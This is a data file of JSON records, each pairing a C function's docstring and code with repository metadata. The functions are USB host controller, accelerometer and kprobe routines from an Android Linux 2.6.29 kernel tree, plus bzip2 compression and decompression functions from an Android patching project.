{"docstring": "/* Called from some interrupts, timers, and so on.\n * It calls driver completion functions, after dropping oxu->lock.\n */\n", "func_signal": "static void ehci_work(struct oxu_hcd *oxu)", "code": "{\n\ttimer_action_done(oxu, TIMER_IO_WATCHDOG);\n\tif (oxu->reclaim_ready)\n\t\tend_unlink_async(oxu);\n\n\t/* another CPU may drop oxu->lock during a schedule scan while\n\t * it reports urb completions.  this flag guards against bogus\n\t * attempts at re-entrant schedule scanning.\n\t */\n\tif (oxu->scanning)\n\t\treturn;\n\toxu->scanning = 1;\n\tscan_async(oxu);\n\tif (oxu->next_uframe != -1)\n\t\tscan_periodic(oxu);\n\toxu->scanning = 0;\n\n\t/* the IO watchdog guards against hardware or driver bugs that\n\t * misplace IRQs, and should let us run completely without IRQs.\n\t * such lossage has been observed on both VT6202 and VT8235.\n\t */\n\tif (HC_IS_RUNNING(oxu_to_hcd(oxu)->state) &&\n\t\t\t(oxu->async->qh_next.ptr != NULL ||\n\t\t\t oxu->periodic_sched != 0))\n\t\ttimer_action(oxu, TIMER_IO_WATCHDOG);\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/* Reset a non-running (STS_HALT == 1) controller */\n", "func_signal": "static int ehci_reset(struct oxu_hcd *oxu)", "code": "{\n\tint\tretval;\n\tu32\tcommand = readl(&oxu->regs->command);\n\n\tcommand |= CMD_RESET;\n\tdbg_cmd(oxu, \"reset\", command);\n\twritel(command, &oxu->regs->command);\n\toxu_to_hcd(oxu)->state = HC_STATE_HALT;\n\toxu->next_statechange = jiffies;\n\tretval = handshake(oxu, &oxu->regs->command,\n\t\t\t    CMD_RESET, 0, 250 * 1000);\n\n\tif (retval)\n\t\treturn retval;\n\n\ttdi_reset(oxu);\n\n\treturn retval;\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/* One-time init, only for memory state.\n */\n", "func_signal": "static int oxu_hcd_init(struct usb_hcd *hcd)", "code": "{\n\tstruct oxu_hcd *oxu = hcd_to_oxu(hcd);\n\tu32 temp;\n\tint retval;\n\tu32 hcc_params;\n\n\tspin_lock_init(&oxu->lock);\n\n\tinit_timer(&oxu->watchdog);\n\toxu->watchdog.function = oxu_watchdog;\n\toxu->watchdog.data = (unsigned long) oxu;\n\n\t/*\n\t * hw default: 1K periodic list heads, one per frame.\n\t * periodic_size can shrink by USBCMD update if hcc_params allows.\n\t */\n\toxu->periodic_size = DEFAULT_I_TDPS;\n\tretval = ehci_mem_init(oxu, GFP_KERNEL);\n\tif (retval < 0)\n\t\treturn retval;\n\n\t/* controllers may cache some of the periodic schedule ... */\n\thcc_params = readl(&oxu->caps->hcc_params);\n\tif (HCC_ISOC_CACHE(hcc_params))\t\t/* full frame cache */\n\t\toxu->i_thresh = 8;\n\telse\t\t\t\t\t/* N microframes cached */\n\t\toxu->i_thresh = 2 + HCC_ISOC_THRES(hcc_params);\n\n\toxu->reclaim = NULL;\n\toxu->reclaim_ready = 0;\n\toxu->next_uframe = -1;\n\n\t/*\n\t * dedicate a qh for the async ring head, since we couldn't unlink\n\t * a 'real' qh without stopping the async schedule [4.8].  use it\n\t * as the 'reclamation list head' too.\n\t * its dummy is used in hw_alt_next of many tds, to prevent the qh\n\t * from automatically advancing to the next td after short reads.\n\t */\n\toxu->async->qh_next.qh = NULL;\n\toxu->async->hw_next = QH_NEXT(oxu->async->qh_dma);\n\toxu->async->hw_info1 = cpu_to_le32(QH_HEAD);\n\toxu->async->hw_token = cpu_to_le32(QTD_STS_HALT);\n\toxu->async->hw_qtd_next = EHCI_LIST_END;\n\toxu->async->qh_state = QH_STATE_LINKED;\n\toxu->async->hw_alt_next = QTD_NEXT(oxu->async->dummy->qtd_dma);\n\n\t/* clear interrupt enables, set irq latency */\n\tif (log2_irq_thresh < 0 || log2_irq_thresh > 6)\n\t\tlog2_irq_thresh = 0;\n\ttemp = 1 << (16 + log2_irq_thresh);\n\tif (HCC_CANPARK(hcc_params)) {\n\t\t/* HW default park == 3, on hardware that supports it (like\n\t\t * NVidia and ALI silicon), maximizes throughput on the async\n\t\t * schedule by avoiding QH fetches between transfers.\n\t\t *\n\t\t * With fast usb storage devices and NForce2, \"park\" seems to\n\t\t * make problems:  throughput reduction (!), data errors...\n\t\t */\n\t\tif (park) {\n\t\t\tpark = min(park, (unsigned) 3);\n\t\t\ttemp |= CMD_PARK;\n\t\t\ttemp |= park << 8;\n\t\t}\n\t\toxu_dbg(oxu, \"park %d\\n\", park);\n\t}\n\tif (HCC_PGM_FRAMELISTLEN(hcc_params)) {\n\t\t/* periodic schedule size can be smaller than default */\n\t\ttemp &= ~(3 << 2);\n\t\ttemp |= (EHCI_TUNE_FLS << 2);\n\t}\n\toxu->command = temp;\n\n\treturn 0;\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/*hui add end*/\n", "func_signal": "static int __init lis302dl_init(void)", "code": "{\n\tprintk(KERN_INFO\"lis302dl_init\\n\");\n\t\n\tlis302dl_wq = create_singlethread_workqueue(\"lis302_wq\");\n\tif(!lis302dl_wq)\n\t\treturn -ENOMEM;\n\treturn i2c_add_driver(&lis302dl_driver);\n}", "path": "kernel\\2.6.29\\drivers\\i2c\\chips\\lis302dl_misc.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/* Bulk qh holds the data toggle */\n", "func_signal": "static void oxu_endpoint_disable(struct usb_hcd *hcd,\n\t\t\t\t\tstruct usb_host_endpoint *ep)", "code": "{\n\tstruct oxu_hcd *oxu = hcd_to_oxu(hcd);\n\tunsigned long\t\tflags;\n\tstruct ehci_qh\t\t*qh, *tmp;\n\n\t/* ASSERT:  any requests/urbs are being unlinked */\n\t/* ASSERT:  nobody can be submitting urbs for this any more */\n\nrescan:\n\tspin_lock_irqsave(&oxu->lock, flags);\n\tqh = ep->hcpriv;\n\tif (!qh)\n\t\tgoto done;\n\n\t/* endpoints can be iso streams.  for now, we don't\n\t * accelerate iso completions ... so spin a while.\n\t */\n\tif (qh->hw_info1 == 0) {\n\t\toxu_vdbg(oxu, \"iso delay\\n\");\n\t\tgoto idle_timeout;\n\t}\n\n\tif (!HC_IS_RUNNING(hcd->state))\n\t\tqh->qh_state = QH_STATE_IDLE;\n\tswitch (qh->qh_state) {\n\tcase QH_STATE_LINKED:\n\t\tfor (tmp = oxu->async->qh_next.qh;\n\t\t\t\ttmp && tmp != qh;\n\t\t\t\ttmp = tmp->qh_next.qh)\n\t\t\tcontinue;\n\t\t/* periodic qh self-unlinks on empty */\n\t\tif (!tmp)\n\t\t\tgoto nogood;\n\t\tunlink_async(oxu, qh);\n\t\t/* FALL THROUGH */\n\tcase QH_STATE_UNLINK:\t\t/* wait for hw to finish? */\nidle_timeout:\n\t\tspin_unlock_irqrestore(&oxu->lock, flags);\n\t\tschedule_timeout_uninterruptible(1);\n\t\tgoto rescan;\n\tcase QH_STATE_IDLE:\t\t/* fully unlinked */\n\t\tif (list_empty(&qh->qtd_list)) {\n\t\t\tqh_put(qh);\n\t\t\tbreak;\n\t\t}\n\t\t/* else FALL THROUGH */\n\tdefault:\nnogood:\n\t\t/* caller was supposed to have unlinked any requests;\n\t\t * that's not our job.  just leak this memory.\n\t\t */\n\t\toxu_err(oxu, \"qh %p (#%02x) state %d%s\\n\",\n\t\t\tqh, ep->desc.bEndpointAddress, qh->qh_state,\n\t\t\tlist_empty(&qh->qtd_list) ? \"\" : \"(has tds)\");\n\t\tbreak;\n\t}\n\tep->hcpriv = NULL;\ndone:\n\tspin_unlock_irqrestore(&oxu->lock, flags);\n\treturn;\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/*\n * periodic_next_shadow - return \"next\" pointer on shadow list\n * @periodic: host pointer to qh/itd/sitd\n * @tag: hardware tag for type of this record\n */\n", "func_signal": "static union ehci_shadow *periodic_next_shadow(union ehci_shadow *periodic,\n\t\t\t\t\t\t__le32 tag)", "code": "{\n\tswitch (tag) {\n\tdefault:\n\tcase Q_TYPE_QH:\n\t\treturn &periodic->qh->qh_next;\n\t}\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/* Force HC to halt state from unknown (EHCI spec section 2.3) */\n", "func_signal": "static int ehci_halt(struct oxu_hcd *oxu)", "code": "{\n\tu32\ttemp = readl(&oxu->regs->status);\n\n\t/* disable any irqs left enabled by previous code */\n\twritel(0, &oxu->regs->intr_enable);\n\n\tif ((temp & STS_HALT) != 0)\n\t\treturn 0;\n\n\ttemp = readl(&oxu->regs->command);\n\ttemp &= ~CMD_RUN;\n\twritel(temp, &oxu->regs->command);\n\treturn handshake(oxu, &oxu->regs->status,\n\t\t\t  STS_HALT, STS_HALT, 16 * 125);\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/* The queue heads and transfer descriptors are managed from pools tied\n * to each of the \"per device\" structures.\n * This is the initialisation and cleanup code.\n */\n", "func_signal": "static void ehci_mem_cleanup(struct oxu_hcd *oxu)", "code": "{\n\tkfree(oxu->murb_pool);\n\toxu->murb_pool = NULL;\n\n\tif (oxu->async)\n\t\tqh_put(oxu->async);\n\toxu->async = NULL;\n\n\tdel_timer(&oxu->urb_timer);\n\n\toxu->periodic = NULL;\n\n\t/* shadow periodic table */\n\tkfree(oxu->pshadow);\n\toxu->pshadow = NULL;\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/*\n * Return-probe handler: Log the return value and duration. Duration may turn\n * out to be zero consistently, depending upon the granularity of time\n * accounting on the platform.\n */\n", "func_signal": "static int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)", "code": "{\n\tint retval = regs_return_value(regs);\n\tstruct my_data *data = (struct my_data *)ri->data;\n\ts64 delta;\n\tktime_t now;\n\n\tnow = ktime_get();\n\tdelta = ktime_to_ns(ktime_sub(now, data->entry_stamp));\n\tprintk(KERN_INFO \"%s returned %d and took %lld ns to execute\\n\",\n\t\t\tfunc_name, retval, (long long)delta);\n\treturn 0;\n}", "path": "kernel\\2.6.29\\samples\\kprobes\\kretprobe_example.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/**\n *\tsupport irq read data.\t//add by hui\n */\n", "func_signal": "static int lis302_i2c_read_byte(struct i2c_client *client,unsigned char adr)", "code": "{\n\tchar buf;\n\tint ret;\n\t\n\tbuf = adr;\n\tret =i2c_master_send(client, &buf, 1);\n\tif(ret<0){\n\t\tdev_err(&client->dev, \"failed to transmit instructions to lis302.\\n\");\n\t\treturn ret;\n\t}\n\t\n\tret = i2c_master_recv(client, &buf, 1);\n\tif (ret<0){\n\t\tdev_err(&client->dev, \"failed to receive response from lis302.\\n\");\n\t\treturn ret;\n\t}\n\t\n\treturn ret = buf;\n}", "path": "kernel\\2.6.29\\drivers\\i2c\\chips\\lis302dl_misc.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/* Kick in for silicon on any bus (not just pci, etc).\n * This forcibly disables dma and IRQs, helping kexec and other cases\n * where the next system software may expect clean state.\n */\n", "func_signal": "static void oxu_shutdown(struct usb_hcd *hcd)", "code": "{\n\tstruct oxu_hcd *oxu = hcd_to_oxu(hcd);\n\n\t(void) ehci_halt(oxu);\n\tehci_turn_off_all_ports(oxu);\n\n\t/* make BIOS/etc use companion controller during reboot */\n\twritel(0, &oxu->regs->configured_flag);\n\n\t/* unblock posted writes */\n\treadl(&oxu->regs->configured_flag);\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/**\n * fsl_lbc_find - find Localbus bank\n * @addr_base:\tbase address of the memory bank\n *\n * This function walks LBC banks comparing \"Base address\" field of the BR\n * registers with the supplied addr_base argument. When bases match this\n * function returns bank number (starting with 0), otherwise it returns\n * appropriate errno value.\n */\n", "func_signal": "int fsl_lbc_find(phys_addr_t addr_base)", "code": "{\n\tint i;\n\n\tif (!fsl_lbc_regs)\n\t\treturn -ENODEV;\n\n\tfor (i = 0; i < ARRAY_SIZE(fsl_lbc_regs->bank); i++) {\n\t\t__be32 br = in_be32(&fsl_lbc_regs->bank[i].br);\n\t\t__be32 or = in_be32(&fsl_lbc_regs->bank[i].or);\n\n\t\tif (br & BR_V && (br & or & BR_BA) == addr_base)\n\t\t\treturn i;\n\t}\n\n\treturn -ENOENT;\n}", "path": "kernel\\2.6.29\\arch\\powerpc\\sysdev\\fsl_lbc.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/* caller must hold oxu->lock */\n", "func_signal": "static void periodic_unlink(struct oxu_hcd *oxu, unsigned frame, void *ptr)", "code": "{\n\tunion ehci_shadow *prev_p = &oxu->pshadow[frame];\n\t__le32 *hw_p = &oxu->periodic[frame];\n\tunion ehci_shadow here = *prev_p;\n\n\t/* find predecessor of \"ptr\"; hw and shadow lists are in sync */\n\twhile (here.ptr && here.ptr != ptr) {\n\t\tprev_p = periodic_next_shadow(prev_p, Q_NEXT_TYPE(*hw_p));\n\t\thw_p = here.hw_next;\n\t\there = *prev_p;\n\t}\n\t/* an interrupt entry (at list end) could have been shared */\n\tif (!here.ptr)\n\t\treturn;\n\n\t/* update shadow and hardware lists ... the old \"next\" pointers\n\t * from ptr may still be in use, the caller updates them.\n\t */\n\t*prev_p = *periodic_next_shadow(&here, Q_NEXT_TYPE(*hw_p));\n\t*hw_p = *here.hw_next;\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/* how many of the uframe's 125 usecs are allocated? */\n", "func_signal": "static unsigned short periodic_usecs(struct oxu_hcd *oxu,\n\t\t\t\t\tunsigned frame, unsigned uframe)", "code": "{\n\t__le32 *hw_p = &oxu->periodic[frame];\n\tunion ehci_shadow *q = &oxu->pshadow[frame];\n\tunsigned usecs = 0;\n\n\twhile (q->ptr) {\n\t\tswitch (Q_NEXT_TYPE(*hw_p)) {\n\t\tcase Q_TYPE_QH:\n\t\tdefault:\n\t\t\t/* is it in the S-mask? */\n\t\t\tif (q->qh->hw_info2 & cpu_to_le32(1 << uframe))\n\t\t\t\tusecs += q->qh->usecs;\n\t\t\t/* ... or C-mask? */\n\t\t\tif (q->qh->hw_info2 & cpu_to_le32(1 << (8 + uframe)))\n\t\t\t\tusecs += q->qh->c_usecs;\n\t\t\thw_p = &q->qh->hw_next;\n\t\t\tq = &q->qh->qh_next;\n\t\t\tbreak;\n\t\t}\n\t}\n#ifdef DEBUG\n\tif (usecs > 100)\n\t\toxu_err(oxu, \"uframe %d sched overrun: %d usecs\\n\",\n\t\t\t\t\t\tframe * 8 + uframe, usecs);\n#endif\n\treturn usecs;\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/*\n * For control/bulk/interrupt, return QH with these TDs appended.\n * Allocates and initializes the QH if necessary.\n * Returns null if it can't allocate a QH it needs to.\n * If the QH has TDs (urbs) already, that's great.\n */\n", "func_signal": "static struct ehci_qh *qh_append_tds(struct oxu_hcd *oxu,\n\t\t\t\tstruct urb *urb, struct list_head *qtd_list,\n\t\t\t\tint epnum, void\t**ptr)", "code": "{\n\tstruct ehci_qh *qh = NULL;\n\n\tqh = (struct ehci_qh *) *ptr;\n\tif (unlikely(qh == NULL)) {\n\t\t/* can't sleep here, we have oxu->lock... */\n\t\tqh = qh_make(oxu, urb, GFP_ATOMIC);\n\t\t*ptr = qh;\n\t}\n\tif (likely(qh != NULL)) {\n\t\tstruct ehci_qtd\t*qtd;\n\n\t\tif (unlikely(list_empty(qtd_list)))\n\t\t\tqtd = NULL;\n\t\telse\n\t\t\tqtd = list_entry(qtd_list->next, struct ehci_qtd,\n\t\t\t\t\tqtd_list);\n\n\t\t/* control qh may need patching ... */\n\t\tif (unlikely(epnum == 0)) {\n\n\t\t\t/* usb_reset_device() briefly reverts to address 0 */\n\t\t\tif (usb_pipedevice(urb->pipe) == 0)\n\t\t\t\tqh->hw_info1 &= ~QH_ADDR_MASK;\n\t\t}\n\n\t\t/* just one way to queue requests: swap with the dummy qtd.\n\t\t * only hc or qh_refresh() ever modify the overlay.\n\t\t */\n\t\tif (likely(qtd != NULL)) {\n\t\t\tstruct ehci_qtd\t*dummy;\n\t\t\tdma_addr_t dma;\n\t\t\t__le32 token;\n\n\t\t\t/* to avoid racing the HC, use the dummy td instead of\n\t\t\t * the first td of our list (becomes new dummy).  both\n\t\t\t * tds stay deactivated until we're done, when the\n\t\t\t * HC is allowed to fetch the old dummy (4.10.2).\n\t\t\t */\n\t\t\ttoken = qtd->hw_token;\n\t\t\tqtd->hw_token = HALT_BIT;\n\t\t\twmb();\n\t\t\tdummy = qh->dummy;\n\n\t\t\tdma = dummy->qtd_dma;\n\t\t\t*dummy = *qtd;\n\t\t\tdummy->qtd_dma = dma;\n\n\t\t\tlist_del(&qtd->qtd_list);\n\t\t\tlist_add(&dummy->qtd_list, qtd_list);\n\t\t\tlist_splice(qtd_list, qh->qtd_list.prev);\n\n\t\t\tehci_qtd_init(qtd, qtd->qtd_dma);\n\t\t\tqh->dummy = qtd;\n\n\t\t\t/* hc must see the new dummy at list end */\n\t\t\tdma = qtd->qtd_dma;\n\t\t\tqtd = list_entry(qh->qtd_list.prev,\n\t\t\t\t\tstruct ehci_qtd, qtd_list);\n\t\t\tqtd->hw_next = QTD_NEXT(dma);\n\n\t\t\t/* let the hc process these next qtds */\n\t\t\tdummy->hw_token = (token & ~(0x80));\n\t\t\twmb();\n\t\t\tdummy->hw_token = token;\n\n\t\t\turb->hcpriv = qh_get(qh);\n\t\t}\n\t}\n\treturn qh;\n}", "path": "kernel\\2.6.29\\drivers\\usb\\host\\oxu210hp-hcd.c", "repo_name": "lamian/m8_android_kernel", "stars": 42, "license": "None", "language": "c", "size": 84791}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzCompress) ( bz_stream *strm, int action )", "code": "{\n   Bool progress;\n   EState* s;\n   if (strm == NULL) return BZ_PARAM_ERROR;\n   s = strm->state;\n   if (s == NULL) return BZ_PARAM_ERROR;\n   if (s->strm != strm) return BZ_PARAM_ERROR;\n\n   preswitch:\n   switch (s->mode) {\n\n      case BZ_M_IDLE:\n         return BZ_SEQUENCE_ERROR;\n\n      case BZ_M_RUNNING:\n         if (action == BZ_RUN) {\n            progress = handle_compress ( strm );\n            return progress ? BZ_RUN_OK : BZ_PARAM_ERROR;\n         } \n         else\n\t if (action == BZ_FLUSH) {\n            s->avail_in_expect = strm->avail_in;\n            s->mode = BZ_M_FLUSHING;\n            goto preswitch;\n         }\n         else\n         if (action == BZ_FINISH) {\n            s->avail_in_expect = strm->avail_in;\n            s->mode = BZ_M_FINISHING;\n            goto preswitch;\n         }\n         else \n            return BZ_PARAM_ERROR;\n\n      case BZ_M_FLUSHING:\n         if (action != BZ_FLUSH) return BZ_SEQUENCE_ERROR;\n         if (s->avail_in_expect != s->strm->avail_in) \n            return BZ_SEQUENCE_ERROR;\n         progress = handle_compress ( strm );\n         if (s->avail_in_expect > 0 || !isempty_RL(s) ||\n             s->state_out_pos < s->numZ) return BZ_FLUSH_OK;\n         s->mode = BZ_M_RUNNING;\n         return BZ_RUN_OK;\n\n      case BZ_M_FINISHING:\n         if (action != BZ_FINISH) return BZ_SEQUENCE_ERROR;\n         if (s->avail_in_expect != s->strm->avail_in) \n            return BZ_SEQUENCE_ERROR;\n         progress = handle_compress ( strm );\n         if (!progress) return BZ_SEQUENCE_ERROR;\n         if (s->avail_in_expect > 0 || !isempty_RL(s) ||\n             s->state_out_pos < s->numZ) return BZ_FINISH_OK;\n         s->mode = BZ_M_IDLE;\n         return BZ_STREAM_END;\n   }\n   return BZ_OK; /*--not reached--*/\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nvoid prepare_new_block ( EState* s )", "code": "{\n   Int32 i;\n   s->nblock = 0;\n   s->numZ = 0;\n   s->state_out_pos = 0;\n   BZ_INITIALISE_CRC ( s->blockCRC );\n   for (i = 0; i < 256; i++) s->inUse[i] = False;\n   s->blockNo++;\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzRead) \n           ( int*    bzerror, \n             BZFILE* b, \n             void*   buf, \n             int     len )", "code": "{\n   Int32   n, ret;\n   bzFile* bzf = (bzFile*)b;\n\n   BZ_SETERR(BZ_OK);\n\n   if (bzf == NULL || buf == NULL || len < 0)\n      { BZ_SETERR(BZ_PARAM_ERROR); return 0; };\n\n   if (bzf->writing)\n      { BZ_SETERR(BZ_SEQUENCE_ERROR); return 0; };\n\n   if (len == 0)\n      { BZ_SETERR(BZ_OK); return 0; };\n\n   bzf->strm.avail_out = len;\n   bzf->strm.next_out = buf;\n\n   while (True) {\n\n      if (ferror(bzf->handle)) \n         { BZ_SETERR(BZ_IO_ERROR); return 0; };\n\n      if (bzf->strm.avail_in == 0 && !myfeof(bzf->handle)) {\n         n = fread ( bzf->buf, sizeof(UChar), \n                     BZ_MAX_UNUSED, bzf->handle );\n         if (ferror(bzf->handle))\n            { BZ_SETERR(BZ_IO_ERROR); return 0; };\n         bzf->bufN = n;\n         bzf->strm.avail_in = bzf->bufN;\n         bzf->strm.next_in = bzf->buf;\n      }\n\n      ret = BZ2_bzDecompress ( &(bzf->strm) );\n\n      if (ret != BZ_OK && ret != BZ_STREAM_END)\n         { BZ_SETERR(ret); return 0; };\n\n      if (ret == BZ_OK && myfeof(bzf->handle) && \n          bzf->strm.avail_in == 0 && bzf->strm.avail_out > 0)\n         { BZ_SETERR(BZ_UNEXPECTED_EOF); return 0; };\n\n      if (ret == BZ_STREAM_END)\n         { BZ_SETERR(BZ_STREAM_END);\n           return len - bzf->strm.avail_out; };\n      if (bzf->strm.avail_out == 0)\n         { BZ_SETERR(BZ_OK); return len; };\n      \n   }\n\n   return 0; /*not reached*/\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nint bz_config_ok ( void )", "code": "{\n   if (sizeof(int)   != 4) return 0;\n   if (sizeof(short) != 2) return 0;\n   if (sizeof(char)  != 1) return 0;\n   return 1;\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "void BZ_API(BZ2_bzWrite)\n             ( int*    bzerror, \n               BZFILE* b, \n               void*   buf, \n               int     len )", "code": "{\n   Int32 n, n2, ret;\n   bzFile* bzf = (bzFile*)b;\n\n   BZ_SETERR(BZ_OK);\n   if (bzf == NULL || buf == NULL || len < 0)\n      { BZ_SETERR(BZ_PARAM_ERROR); return; };\n   if (!(bzf->writing))\n      { BZ_SETERR(BZ_SEQUENCE_ERROR); return; };\n   if (ferror(bzf->handle))\n      { BZ_SETERR(BZ_IO_ERROR); return; };\n\n   if (len == 0)\n      { BZ_SETERR(BZ_OK); return; };\n\n   bzf->strm.avail_in = len;\n   bzf->strm.next_in  = buf;\n\n   while (True) {\n      bzf->strm.avail_out = BZ_MAX_UNUSED;\n      bzf->strm.next_out = bzf->buf;\n      ret = BZ2_bzCompress ( &(bzf->strm), BZ_RUN );\n      if (ret != BZ_RUN_OK)\n         { BZ_SETERR(ret); return; };\n\n      if (bzf->strm.avail_out < BZ_MAX_UNUSED) {\n         n = BZ_MAX_UNUSED - bzf->strm.avail_out;\n         n2 = fwrite ( (void*)(bzf->buf), sizeof(UChar), \n                       n, bzf->handle );\n         if (n != n2 || ferror(bzf->handle))\n            { BZ_SETERR(BZ_IO_ERROR); return; };\n      }\n\n      if (bzf->strm.avail_in == 0)\n         { BZ_SETERR(BZ_OK); return; };\n   }\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzDecompressInit) \n                     ( bz_stream* strm, \n                       int        verbosity,\n                       int        small )", "code": "{\n   DState* s;\n\n   if (!bz_config_ok()) return BZ_CONFIG_ERROR;\n\n   if (strm == NULL) return BZ_PARAM_ERROR;\n   if (small != 0 && small != 1) return BZ_PARAM_ERROR;\n   if (verbosity < 0 || verbosity > 4) return BZ_PARAM_ERROR;\n\n   if (strm->bzalloc == NULL) strm->bzalloc = default_bzalloc;\n   if (strm->bzfree == NULL) strm->bzfree = default_bzfree;\n\n   s = BZALLOC( sizeof(DState) );\n   if (s == NULL) return BZ_MEM_ERROR;\n   s->strm                  = strm;\n   strm->state              = s;\n   s->state                 = BZ_X_MAGIC_1;\n   s->bsLive                = 0;\n   s->bsBuff                = 0;\n   s->calculatedCombinedCRC = 0;\n   strm->total_in_lo32      = 0;\n   strm->total_in_hi32      = 0;\n   strm->total_out_lo32     = 0;\n   strm->total_out_hi32     = 0;\n   s->smallDecompress       = (Bool)small;\n   s->ll4                   = NULL;\n   s->ll16                  = NULL;\n   s->tt                    = NULL;\n   s->currBlockNo           = 0;\n   s->verbosity             = verbosity;\n\n   return BZ_OK;\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nvoid add_pair_to_block ( EState* s )", "code": "{\n   Int32 i;\n   UChar ch = (UChar)(s->state_in_ch);\n   for (i = 0; i < s->state_in_len; i++) {\n      BZ_UPDATE_CRC( s->blockCRC, ch );\n   }\n   s->inUse[s->state_in_ch] = True;\n   switch (s->state_in_len) {\n      case 1:\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         break;\n      case 2:\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         break;\n      case 3:\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         break;\n      default:\n         s->inUse[s->state_in_len-4] = True;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = (UChar)ch; s->nblock++;\n         s->block[s->nblock] = ((UChar)(s->state_in_len-4));\n         s->nblock++;\n         break;\n   }\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzCompressEnd)  ( bz_stream *strm )", "code": "{\n   EState* s;\n   if (strm == NULL) return BZ_PARAM_ERROR;\n   s = strm->state;\n   if (s == NULL) return BZ_PARAM_ERROR;\n   if (s->strm != strm) return BZ_PARAM_ERROR;\n\n   if (s->arr1 != NULL) BZFREE(s->arr1);\n   if (s->arr2 != NULL) BZFREE(s->arr2);\n   if (s->ftab != NULL) BZFREE(s->ftab);\n   BZFREE(strm->state);\n\n   strm->state = NULL;   \n\n   return BZ_OK;\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "void BZ_API(BZ2_bzReadGetUnused) \n                     ( int*    bzerror, \n                       BZFILE* b, \n                       void**  unused, \n                       int*    nUnused )", "code": "{\n   bzFile* bzf = (bzFile*)b;\n   if (bzf == NULL)\n      { BZ_SETERR(BZ_PARAM_ERROR); return; };\n   if (bzf->lastErr != BZ_STREAM_END)\n      { BZ_SETERR(BZ_SEQUENCE_ERROR); return; };\n   if (unused == NULL || nUnused == NULL)\n      { BZ_SETERR(BZ_PARAM_ERROR); return; };\n\n   BZ_SETERR(BZ_OK);\n   *nUnused = bzf->strm.avail_in;\n   *unused = bzf->strm.next_in;\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
